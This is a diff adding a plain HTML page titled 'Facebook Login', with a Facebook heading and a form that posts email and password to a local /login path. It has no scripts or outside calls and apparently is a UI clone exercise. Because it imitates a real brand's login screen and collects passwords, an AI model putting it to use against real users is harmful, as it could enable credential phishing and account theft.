@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <h1>Facebook</h1>
+        </div>
+        <div class="login-form">
+            <form action="/login" method="POST">
+                <input type="email" name="email" placeholder="Email or Phone Number" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+                <a href="#" class="forgot-password">Forgot Password?</a>
+            </form>
+        </div>
+        <div class="signup-link">
+            <a href="#">Create New Account</a>
+        </div>
+    </div>
+</body>
+</html>
